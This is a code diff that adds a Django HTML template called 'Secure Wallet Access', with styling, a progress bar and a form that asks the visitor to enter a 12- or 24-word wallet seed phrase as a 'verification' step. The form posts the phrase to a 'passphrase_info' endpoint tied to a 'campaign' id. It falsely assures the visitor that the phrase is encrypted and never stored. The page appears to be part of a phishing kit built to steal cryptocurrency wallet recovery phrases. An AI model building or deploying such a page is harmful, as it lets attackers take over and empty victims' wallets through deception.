@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Wallet Access</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --primary-color: #3498db;
+            --primary-hover: #4338ca;
+            --background: #f9fafb;
+            --card-background: #ffffff;
+            --text-primary: #24246f;
+            --text-secondary: #6b7280;
+            --border-color: #e5e7eb;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            background-color: var(--background);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .container {
+            background-color: var(--card-background);
+            padding: 2.5rem;
+            border-radius: 1rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            width: 100%;
+            max-width: 450px;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2.3rem;
+        }
+
+        .header h2 {
+            color: var(--text-primary);
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 2.5rem;
+        }
+
+        .header p {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            line-height: 1.5;
+            text-align: start;
+
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        .textarea-wrapper {
+            position: relative;
+        }
+
+        .textarea-wrapper textarea {
+            width: 100%;
+            min-height: 120px;
+            padding: 1rem;
+            border: 2px solid var(--border-color);
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            line-height: 1.5;
+            transition: all 0.2s ease;
+            resize: vertical;
+            background-color: white;
+        }
+
+        .textarea-wrapper textarea:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+        }
+
+        .textarea-wrapper textarea.error {
+            border-color: var(--error-color);
+            background-color: var(--error-bg);
+        }
+
+        .textarea-wrapper textarea.error:focus {
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 0.875rem;
+            margin-top: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem;
+            border-radius: 0.375rem;
+            animation: slideIn 0.3s ease-out;
+            margin-bottom: 1rem;
+            background-color: #3498db2e;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-5px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        
+        .char-counter {
+            position: absolute;
+            bottom: 0.5rem;
+            right: 0.75rem;
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            pointer-events: none;
+        }
+
+        .toggle-visibility {
+            position: absolute;
+            right: 1rem;
+            top: 1rem;
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            padding: 0.25rem;
+            border-radius: 0.25rem;
+            transition: all 0.2s ease;
+        }
+
+        .toggle-visibility:hover {
+            color: var(--text-primary);
+            background-color: var(--background);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 0.75rem 1.5rem;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .security-note {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            background-color: #f3f4f6;
+            border-radius: 0.5rem;
+            font-size: 0.875rem;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .format-hint {
+            margin-top: 0.5rem;
+            font-size: 0.875rem;
+            color: var(--text-secondary);
+        }
+
+        @media (max-width: 640px) {
+            .container {
+                padding: 1.5rem;
+            }
+        }
+
+
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background-color: #3498db;
+            transform: translateY(-50%);
+        }
+
+        .progress-step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #ffffff;
+            border: 2px solid #3498db;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            color: #3498db;
+            position: relative;
+            z-index: 1;
+        }
+
+        .progress-step.active {
+            background-color: #3498db;
+            color: #ffffff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="progress-bar">
+            <div class="progress-step active">1</div>
+            <div class="progress-step active">2</div>
+            <div class="progress-step active">3</div>
+        </div>
+        <div class="header">
+            <h2>Secure Wallet Access</h2>
+            <p>Enter seedphrase to continue with the verification process.</p>
+        </div>
+
+        <form method="post" action="{% url 'core:passphrase_info' campaign_id=campaign.id %}">
+            {% csrf_token %}
+
+            <div class="form-group">
+                <label for="id_passphrase">Wallet Passphrase</label>
+                <div class="textarea-wrapper">
+                    {{ form.passphrase }}
+                    {% if form.passphrase.errors %}
+                    <div class="error-message">
+                        <i class="fas fa-exclamation-circle"></i>
+                        {{ form.passphrase.errors.0 }}
+                    </div>
+                    {% endif %}
+                    <div class="char-counter">
+                        <span id="charCount">0</span>/500
+                    </div>
+                </div>
+                <div class="format-hint">
+                    <i class="fas fa-info-circle"></i>
+                    Usually 12 or 24 words separated by spaces
+                </div>
+            </div>
+
+            {% if form.non_field_errors %}
+            <div class="error-message">
+                <i class="fas fa-exclamation-circle"></i>
+                {{ form.non_field_errors.0 }}
+            </div>
+            {% endif %}
+
+            <button type="submit" class="btn-primary">
+                Continue Securely
+            </button>
+
+            <div class="security-note">
+                <i class="fas fa-shield-alt"></i>
+                <span>Your passphrase is encrypted and secure. We never store your passphrase on our servers.</span>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Character counter
+        document.getElementById('id_passphrase').addEventListener('input', function(e) {
+            document.getElementById('charCount').textContent = this.value.length;
+
+            // Remove error styling when user starts typing
+            this.classList.remove('error');
+            const errorMessage = this.parentElement.querySelector('.error-message');
+            if (errorMessage) {
+                errorMessage.style.display = 'none';
+            }
+        });
+
+        // Add error class if there are errors (on page load)
+        {% if form.passphrase.errors %}
+        document.getElementById('id_passphrase').classList.add('error');
+        {% endif %}
+    </script>
+</body>
+</html>
